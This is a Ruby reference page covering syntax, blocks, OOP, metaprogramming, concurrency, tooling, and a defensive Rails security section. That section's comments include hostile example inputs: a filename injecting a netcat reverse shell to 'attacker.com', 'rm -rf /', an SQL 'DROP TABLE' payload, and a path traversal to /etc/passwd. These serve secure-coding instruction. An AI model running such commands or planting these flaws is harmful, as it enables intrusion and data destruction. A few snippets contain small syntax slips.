---
seoTitle: Ruby Programming Reference – Dynamic Systems and Rails Security Guide
description: "Comprehensive Ruby reference covering OOP, blocks, metaprogramming, Ruby on Rails, and critical security issues (YAML deserialization, command injection, RCE, SQLi)."
keywords: "ruby, rails, security, command injection, deserialization, metaprogramming, blocks, procs, lambdas, active record"
displayTitle: Ruby
---

- # History & Intro
	- **How**:
		- Designed by **Yukihiro "Matz" Matsumoto** in Japan in 1993, with its first public release in 1995.
		- Created to blend the best features of Perl, Smalltalk, Eiffel, Ada, and Lisp, aiming to make programming enjoyable and natural for developers.
		- Achieved global adoption in 2004 with the release of **Ruby on Rails** by David Heinemeier Hansson (DHH), which revolutionized database-backed web application development.
		- Evolved through major execution runtimes: Ruby 1.8/1.9 (switching engine structures to YARV virtual machines), Ruby 2.x (introducing performance optimizations), and Ruby 3.x (implementing the "Ruby 3x3" initiative to make execution 3x faster using JIT compilers and static analysis types).
	-
	- **Who**:
		- Designed by **Yukihiro Matsumoto (Matz)**.
		- Maintained by a core development team with contributions from the global open-source community.
	-
	- **Why**:
		- Built with a philosophy focused on **human-centric design** over machine-centric execution. Matz's core principle is to make developers happy and productive through intuitive, readable syntax.
		- Emphasizes pure object-oriented models where **everything is an object**.
-
- # Introduction
	- ## Core Pillars
	  collapsed:: true
		- **Pure Object-Oriented Model** — Absolutely everything (from numbers like `5` to classes themselves) is an object inheriting methods and properties.
		- **Extreme Dynamism** — Classes can be modified at runtime (open classes / monkey patching), methods defined dynamically, and evaluation hooks configured on the fly.
		- **Block Closures** — Heavy reliance on code blocks (`do ... end` or `{ ... }`) to build custom, readable iterators and control abstractions.
		- **Duck Typing** — A object's usability is determined by what methods it responds to rather than its inheritance hierarchy ("If it walks like a duck, it's a duck").
	-
	- ## Advantages
	  collapsed:: true
		- **Expressive Syntax** — Code reads like English, simplifying onboarding and making code highly maintainable.
		- **Rapid Development** — Conventions in frameworks like Rails allow building complex web backends with minimal configuration.
		- **Strong Metaprogramming** — Enables creation of Domain-Specific Languages (DSLs) like RSpec or Active Record.
		- **Active Ecosystem** — Millions of open-source libraries ("gems") are easily integrated using Bundler.
	-
	- ## Disadvantages
	  collapsed:: true
		- **Execution Speed** — As a dynamically interpreted language, Ruby is slower than compiled languages like Go, Rust, or Java for CPU-bound computation.
		- **High Memory Footprint** — The pure object model creates millions of heap objects, resulting in higher memory usage.
		- **Global Interpreter Lock (GIL)** — In CRuby (standard implementation), the GIL limits native thread parallelism, running only one thread at a time for CPU tasks.
		- **Vulnerability Risks** — Dynamic dispatch and evaluation functions (like `eval` or dynamic method calling) can introduce security risks if inputs are not validated.
-
- # Basics & Control Flow
  collapsed:: true
	- ## Variable Scopes
		- Variable type and scope are determined by prefix symbols:
		- ```ruby
		  x = 10          # Local variable (lowercase or starts with underscore)
		  @name = "Alice" # Instance variable (accessible within a class instance)
		  @@count = 0     # Class variable (shared across class hierarchy)
		  $global = true  # Global variable (accessible anywhere - use sparingly)
		  MAX_LIMIT = 100 # Constant (starts with uppercase, re-assignment raises warning)
		  ```
	-
	- ## Basic Data Types
		- ```ruby
		  # Numbers (Objects inheriting from Integer/Float)
		  5.times { puts "Hi" }
		  
		  # Strings & Symbols
		  str = "Hello"   # Mutable string object
		  sym = :hello    # Immutable, unique symbol (used for keys, method names)
		  
		  # Arrays (Ordered list)
		  arr = [1, "two", :three]
		  arr << 4        # Push element
		  
		  # Hashes (Key-value map)
		  hash = { name: "Bob", age: 30 }
		  puts hash[:name]
		  ```
	-
	- ## Control Flow Expressions
		- In Ruby, control flow constructs return values (they are expressions).
		- ```ruby
		  # Standard if-elsif-else
		  age = 20
		  status = if age >= 18
		             "Adult"
		           else
		             "Minor"
		           end
		           
		  # Modifier Form (Inline conditions)
		  puts "Allowed" if age >= 18
		  
		  # Unless (executes if condition is false)
		  puts "Minor" unless age >= 18
		  ```
	-
	- ## Loops & Iterators
		- While standard loops are supported, Ruby developers prefer block-based iterators.
		- ```ruby
		  # While Loop
		  i = 0
		  while i < 3
		    i += 1
		  end
		  
		  # Iterator Loop (Each)
		  [1, 2, 3].each do |num|
		    puts num
		  end
		  
		  # Range Loop
		  (1..5).each { |i| puts i }   # Inclusive: 1,2,3,4,5
		  (1...5).each { |i| puts i }  # Exclusive: 1,2,3,4
		  ```
	-
	- ## Advanced Collection Methods Catalog
		- ```ruby
		  numbers = [1, 2, 3, 4, 5]
		  
		  # map / collect: Transform elements
		  squares = numbers.map { |x| x * x } # [1, 4, 9, 16, 25]
		  
		  # select / filter: Keep elements passing evaluation
		  evens = numbers.select { |x| x.even? } # [2, 4]
		  
		  # reject: Remove elements passing evaluation
		  odds = numbers.reject { |x| x.even? } # [1, 3, 5]
		  
		  # reduce / inject: Accumulate items into a single value
		  sum = numbers.reduce(0) { |sum, n| sum + n } # 15
		  
		  # dig: Safe traversal of nested hashes
		  user = { profile: { address: { city: "Tokyo" } } }
		  city = user.dig(:profile, :address, :city) # "Tokyo"
		  ```
-
- # Blocks, Procs, and Lambdas
  collapsed:: true
	- ## Blocks (Yield)
		- A block is a chunk of code passed to a method. Methods yield control to blocks.
		- ```ruby
		  def run_twice
		    yield if block_given?
		    yield if block_given?
		  end
		  
		  run_twice { puts "Hello" }
		  ```
	-
	- ## Procs
		- A Proc is a block wrapped in an object, allowing it to be stored in variables and passed around.
		- ```ruby
		  my_proc = Proc.new { |x| puts x * 2 }
		  my_proc.call(5) # Outputs: 10
		  ```
	-
	- ## Lambdas
		- Lambdas are strict Proc variations.
		- ```ruby
		  my_lambda = ->(x) { puts x * 2 }
		  my_lambda.call(5)
		  ```
	-
	- ## Critical Differences: Proc vs Lambda
		- 1. **Argument Check**: Lambdas enforce strict argument counts (raises `ArgumentError` if mismatched); Procs ignore extra arguments or set missing ones to `nil`.
		- 2. **Return Behavior**: A `return` inside a lambda exits the lambda block and returns execution control to the calling method; a `return` in a Proc exits both the Proc and the enclosing method that called the Proc (can cause exceptions if outer scope is gone).
-
- # OOP — Object-Oriented Ruby
  collapsed:: true
	- ## Classes & Accessors
		- Classes are declared with `class`. Initialize acts as the constructor.
		- ```ruby
		  class Person
		    # Automatic getter and setter generation
		    attr_accessor :name
		    attr_reader :age
		    
		    def initialize(name, age)
		      @name = name
		      @age = age
		    end
		  end
		  
		  user = Person.new("Alice", 25)
		  user.name = "Bob"
		  ```
	-
	- ## Modules & Mixins
		- Ruby does not support multiple class inheritance. Instead, it uses **Modules** to share code across classes via mixins (`include`, `extend`, `prepend`).
		- ```ruby
		  module Flyable
		    def fly
		      puts "Taking off!"
		    end
		  end
		  
		  class Bird
		    include Flyable # Adds methods to class instances
		  end
		  
		  class Airplane
		    include Flyable
		  end
		  
		  # 'extend' adds module methods as class methods (static methods)
		  class Helicopter
		    extend Flyable
		  end
		  Helicopter.fly # Called directly on class
		  ```
	-
	- ## The Enumerable Module & Custom Iterator
		- The `Enumerable` module provides collection classes with traversal, search, and sorting methods. To include it, define the **`each`** method in your class.
		- ```ruby
		  class Team
		    include Enumerable
		    
		    def initialize
		      @members = []
		    end
		    
		    def add_member(name)
		      @members << name
		    end
		    
		    # Required implementation for Enumerable to work
		    def each(&block)
		      @members.each(&block)
		    end
		  end
		  
		  team = Team.new
		  team.add_member("Alice")
		  team.add_member("Bob")
		  
		  # Now all Enumerable methods are automatically available!
		  team.map { |m| m.upcase }  # ["ALICE", "BOB"]
		  team.include?("Alice")     # true
		  ```
	-
	- ## Method Lookup Path (Ancestors Chain)
		- When invoking a method, Ruby searches the ancestors inheritance hierarchy.
		- ```
		  [Object Instance] 
		         │
		         ▼
		  [Singleton Class (Eigenclass)]
		         │
		         ▼
		  [Prepended Modules]
		         │
		         ▼
		  [Class Definition]
		         │
		         ▼
		  [Included Modules]
		         │
		         ▼
		  [Superclass] -> [Object] -> [Kernel] -> [BasicObject]
		  ```
		- Use `MyClass.ancestors` to inspect the lookup chain array.
	-
	- ## Eigenclass (Singleton Class) Internals
		- Every object has a hidden class associated with it, called the **Eigenclass** or **Singleton Class**. This class stores methods defined only for that specific instance.
		- ```ruby
		  str = "hello"
		  
		  # Define a method only on the 'str' instance
		  def str.speak
		    "shout: " + self.upcase
		  end
		  
		  # Under the hood: speak is added to str's Eigenclass
		  # Class methods are actually singleton methods defined on the class object's Eigenclass:
		  class User
		    class << self
		      # Defined on User's Eigenclass (acts as static class method)
		      def find(id)
		        "Found user $id"
		      end
		    end
		  end
		  ```
-
- # Metaprogramming
  collapsed:: true
	- ## Open Classes (Monkey Patching)
		- You can open any existing class (even standard ones like `String` or `Integer`) at runtime and inject new methods.
		- ```ruby
		  class String
		    def shout
		      self.upcase + "!!!"
		    end
		  end
		  
		  puts "hello".shout # "HELLO!!!"
		  ```
		- > [!WARNING] Monkey Patching Risks
		  > Modifying core classes globally can break third-party libraries if your patches overwrite methods with conflicting behaviors. Use refinements or modules to scope modifications.
	-
	- ## Dynamic Method Definition
		- ```ruby
		  class Service
		    [:get, :post, :put].each do |method_name|
		      define_method(method_name) do |url|
		        puts "Sending #{method_name.upcase} request to #{url}"
		      end
		    end
		  end
		  ```
	-
	- ## method_missing Hook
		- Invoked when Ruby searches for a method and fails to find it. Allows handling dynamic method interfaces.
		- ```ruby
		  class DynamicFinder
		    def method_missing(method_id, *args)
		      if method_id.to_s.start_with?("find_by_")
		        attribute = method_id.to_s.sub("find_by_", "")
		        puts "Searching database where #{attribute} = #{args.first}"
		      else
		        super # Delegate standard missing methods
		      end
		    end
		    
		    def respond_to_missing?(method_id, include_private = false)
		      method_id.to_s.start_with?("find_by_") || super
		    end
		  end
		  ```
	-
	- ## eval: instance_eval vs class_eval
		- **`instance_eval`**: Evaluates code in context of the instance. Property reads/writes can bypass access bounds.
		- **`class_eval` / `module_eval`**: Evaluates code in context of the class. Defines methods available to all class instances.
		- ```ruby
		  class Person
		    def initialize
		      @secret = "Confidential"
		    end
		  end
		  
		  p = Person.new
		  # instance_eval reads private properties
		  p.instance_eval { puts @secret } # "Confidential"
		  
		  # class_eval defines new methods on class
		  Person.class_eval do
		    def talk
		      "Hello!"
		    end
		  end
		  p.talk # "Hello!"
		  ```
-
- # Concurrency & Parallelism
  collapsed:: true
	- ## Threads & GIL limitations
		- CRuby threads map to OS threads, but the **Global Interpreter Lock (GIL)** guarantees only one thread executes Ruby bytecode at a time. Threads are good for I/O operations (network, disk), but provide no speedups for CPU-bound computations.
		- ```ruby
		  threads = []
		  3.times do |i|
		    threads << Thread.new do
		      sleep(1) # Blocks thread, GIL yields to other threads
		      puts "Thread #{i} done"
		    end
		  end
		  threads.each(&:join)
		  ```
	-
	- ## Fibers (Cooperative Scheduling)
		- Fibers are lightweight concurrency units controlled manually by the programmer. They yield execution back and forth explicitly.
		- ```ruby
		  fiber = Fiber.new do
		    puts "Fiber Step 1"
		    Fiber.yield("Yielded Value")
		    puts "Fiber Step 2"
		  end
		  
		  puts fiber.resume # Prints "Fiber Step 1", then returns "Yielded Value"
		  fiber.resume      # Prints "Fiber Step 2"
		  ```
	-
	- ## Ractors (GIL-Free Parallelism - Ruby 3)
		- **Ractors (Ruby Actors)** enable parallel execution on multiple cores without GIL contention. Ractors do not share mutable state by default; communication is handled via message passing.
		- ```ruby
		  # Spawn parallel computation Ractor
		  r = Ractor.new do
		    # Perform CPU-bound tasks
		    result = 1000000.times.reduce(0) { |s, x| s + x }
		    result # returned value is passed to main thread
		  end
		  
		  # Main thread blocks until Ractor finishes and returns result
		  puts "Result from parallel worker: #{r.take}"
		  ```
-
- # Cybersecurity Deep-Dive
  collapsed:: true
	- ## Remote Code Execution (RCE) via eval
		- > [!CAUTION] Dynamic Code Execution
		  > Passing user input directly to `eval`, `instance_eval`, or standard kernel calculations executing strings as code creates RCE vulnerabilities.
		- **Vulnerable Code**:
		  ```ruby
		  # If input contains: System("rm -rf /") or malicious payloads
		  user_formula = params[:formula]
		  result = eval(user_formula) 
		  ```
		- **Secure Mitigation**:
		  1. Avoid `eval`.
		  2. If processing dynamic mathematical formulas, use sandboxed parser libraries (like Dentaku) instead of execution hooks.
		  3. Validate dynamic dispatch strings against a whitelist.
		  ```ruby
		  # Whitelisted execution
		  method_to_call = params[:method]
		  allowed = ["calculate_tax", "calculate_discount"]
		  
		  if allowed.include?(method_to_call)
		    # Send dynamically calls methods without executing strings as code
		    my_calculator.send(method_to_call) 
		  else
		    raise "Unauthorized method access"
		  end
		  ```
	-
	- ## Unsafe Deserialization (YAML.load)
		- > [!CAUTION] Arbitrary Object Instantiation
		  > Standard Ruby YAML parsing (`YAML.load`) allows deserializing arbitrary classes. Attackers can crafts payloads (gadget chains) that trigger command execution when parsed.
		- **Vulnerable Code**:
		  ```ruby
		  require 'yaml'
		  # If user input contains custom class tags e.g. !ruby/object:ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
		  user_data = YAML.load(params[:config]) 
		  ```
		- **Secure Mitigation**:
		  Use `YAML.safe_load` which restricts parsing to simple types (Strings, Symbols, Numbers) and blocks arbitrary class instantiation.
		  ```ruby
		  # Only allow safe parsing
		  user_data = YAML.safe_load(params[:config], permitted_classes: [Symbol])
		  ```
	-
	- ## Command/Shell Injection
		- > [!CAUTION] Dynamic Subprocess Spawning
		  > Using backticks (`` ` ``), `system()`, or `exec()` with string interpolation executes inputs directly inside a subshell, allowing command chaining (e.g. `; rm -rf`).
		- **Vulnerable Code**:
		  ```ruby
		  # If filename is: test.jpg; nc attacker.com 4444 -e /bin/sh
		  filename = params[:file]
		  system("image_processor #{filename}")
		  ```
		- **Secure Mitigation**:
		  Pass commands and arguments as discrete array elements. This executes the binary directly without spawning a shell, preventing argument injection.
		  ```ruby
		  # Safe execution - arguments are treated strictly as file paths, not shell commands
		  system("image_processor", filename)
		  ```
	-
	- ## SQL Injection in ActiveRecord
		- > [!WARNING] Interpolated Query Parameters
		  > Concatenating user inputs into query condition strings bypasses database parameterization.
		- **Vulnerable Code**:
		  ```ruby
		  # SQL Injection bypass
		  User.where("username = '#{params[:username]}' AND password = '#{params[:password]}'")
		  
		  # DANGEROUS: Order and Group clauses do not sanitize strings!
		  # If sort_order parameter is: "id; DROP TABLE users;--"
		  User.order(params[:sort_order])
		  ```
		- **Secure Mitigation**:
		  1. Use hash parameters or array placeholders. Active Record automatically sanitizes these inputs.
		  2. Ensure Order/Group parameter queries are strictly validated against whitelisted column arrays.
		  ```ruby
		  # Hash input (auto-parameterized)
		  User.where(username: params[:username], password: params[:password])
		  
		  # Array placeholders (auto-parameterized)
		  User.where("username = ? AND password = ?", params[:username], params[:password])
		  
		  # Whitelisted Order parameters
		  allowed_sorts = ['name', 'created_at', 'id']
		  sort_col = allowed_sorts.include?(params[:sort]) ? params[:sort] : 'id'
		  User.order(sort_col)
		  ```
	-
	- ## Path Traversal
		- > [!CAUTION] Unvalidated File Paths
		  > Passing user parameters directly to file read calls without checking boundaries allows attackers to read arbitrary internal files (e.g. `../../../../etc/passwd`).
		- **Vulnerable Code**:
		  ```ruby
		  file_path = params[:path]
		  data = File.read("public/files/" + file_path)
		  ```
		- **Secure Mitigation**:
		  Use `File.expand_path` to resolve paths, then verify that the resolved path is located within the target directory boundaries.
		  ```ruby
		  target_dir = File.expand_path("public/files/")
		  resolved_path = File.expand_path("public/files/" + params[:path])
		  
		  # Check that resolved path starts with target directory path
		  if resolved_path.start_with?(target_dir)
		      data = File.read(resolved_path)
		  else
		      raise "Access Denied"
		  end
		  ```
	-
	- ## Regular Expression Denial of Service (ReDoS)
		- > [!WARNING] Backtracking Regex Algorithms
		  > Certain regular expression patterns (e.g. nested repetitions like `(a+)+`) can trigger catastrophic backtracking on long inputs, causing CPU utilization to spike to 100%.
		- **Vulnerable Code**:
		  ```ruby
		  # Exponential execution time on input: aaaaaaaaaaaaaaaaaaaaaaaaaa!
		  regex = /^(a+)+$/
		  puts "Match!" if params[:input] =~ regex
		  ```
		- **Secure Mitigation**:
		  1. Avoid nested quantifiers in regular expressions.
		  2. Set explicit regex execution timeouts (since Ruby 3.2).
		  ```ruby
		  # Globally configure regex timeout limits in config/initializers/security.rb
		  Regexp.timeout = 1.0 # Terminate regex execution after 1 second
		  ```
	-
	- ## Rails Mass Assignment (Privilege Escalation)
		- > [!WARNING] Direct Parameters Injection
		  > In older Rails versions, passing unvalidated hashes directly to SQL creation commands allowed malicious users to inject privileged column values (like `admin = true`).
		- **Vulnerable Code**:
		  ```ruby
		  # If parameter parameters contain: {"user": {"name": "Bob", "admin": true}}
		  @user = User.create(params[:user]) 
		  ```
		- **Secure Mitigation**:
		  Always use **Strong Parameters** to explicitly declare permitted attributes.
		  ```ruby
		  def user_params
		      params.require(:user).permit(:name, :email) // 'admin' is ignored
		  end
		  
		  @user = User.create(user_params)
		  ```
-
- # Ecosystem & Tooling
  collapsed:: true
	- ## RubyGems & Bundler (Gemfile)
		- Dependencies are configured in a `Gemfile`:
		- ```ruby
		  source 'https://rubygems.org'
		  
		  gem 'rails', '~> 7.0.0'
		  gem 'pg', '~> 1.4'
		  gem 'sidekiq', '>= 6.5'
		  
		  group :test do
		    gem 'rspec', '~> 3.12'
		  end
		  ```
		- ```bash
		  bundle install      # Install all gems listed in Gemfile
		  bundle exec <cmd>   # Run command in the context of the bundle dependencies
		  bundle update       # Update gems to latest permitted versions
		  ```
	-
	- ## Testing with RSpec
		- Behavioral test framework:
		- ```ruby
		  # spec/calculator_spec.rb
		  require 'calculator'
		  
		  RSpec.describe Calculator do
		    describe '#add' do
		      it 'returns the sum of two numbers' do
		        calc = Calculator.new
		        expect(calc.add(2, 3)).to eq(5)
		      end
		    end
		  end
		  ```
-
- # Comparison: Ruby vs C++
  collapsed:: true
	- ## Direct Comparison Table
		- ```
		  Feature                  Ruby                                    C++
		  Programming Paradigm     Pure Object-Oriented + Functional mix    Multi-paradigm (Procedural, OOP, Generic)
		  Type Safety              Dynamic typing (Duck typing)             Strict static compile-time typing
		  Memory Management        Automatic Garbage Collection (GC)       Manual RAII / Smart Pointers / Raw delete
		  Execution                Interpreted (YARV VM) + optional JIT     Compiled directly to machine assembly
		  Metaprogramming          Highly dynamic, dynamic method definitions Templates, macros, compile-time constexpr
		  Concurrency Safety       Thread + GIL limits CPU parallelism      Manual locks, atomic operations (low-level)
		  Package Manager          RubyGems / Bundler (Standardized)        Decentralized (Conan, Vcpkg, CMake)
		  ```
-
- # Libs & Framework
	- ## Web Frameworks:
		- [[Ruby on Rails]] - The industry-standard MVC framework. Promotes rapid development, convention over configuration, and active components (ActiveRecord, ActionPack, ActionView).
		- [[Sinatra]] - Minimalist Domain-Specific Language (DSL) for building APIs and microservices in Ruby.
		- [[Hanami]] - A modern, lightweight full-stack framework focusing on modular architecture, safety, and thread safety.
	-
	- ## Testing & Automation:
		- [[RSpec]] - Behavior-Driven Development testing suite emphasizing readable assertions.
		- [[Minitest]] - Lightweight and fast testing harness library included in Ruby's standard library.
		- [[Capybara]] - Integration and system testing library simulating user interactions in browsers.
	-
	- ## Background Jobs & Queue Managers:
		- [[Sidekiq]] - Fast background job processor utilizing Redis for queue storage and multithreaded workers.
		- [[ActiveJob]] - Rails integration layer allowing abstract configurations for job adapters.
	-
	- ## Security & Auth:
		- [[Devise]] - Complete authentication engine for Rails applications, providing secure password hashing, reset mechanisms, and session management.
		- [[Pundit]] - Minimal authorization helper using standard Ruby classes to validate security policies.
	-
	- ## Database ORM:
		- [[ActiveRecord]] - Active Record pattern implementation for Rails database interactions.
		- [[Sequel]] - Lightweight and highly customizable database toolkit and ORM.
-
- # More Learn
	- Explore the following links for valuable resources, communities, and tools to enhance your skills : -
		- [Ruby official website](https://www.ruby-lang.org/)
		- [The Ruby Reference Documentation](https://ruby-doc.org/)
		- [Ruby on Rails Guides](https://guides.rubyonrails.org/)
		- [Ruby Security Guide (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheatsheet.html)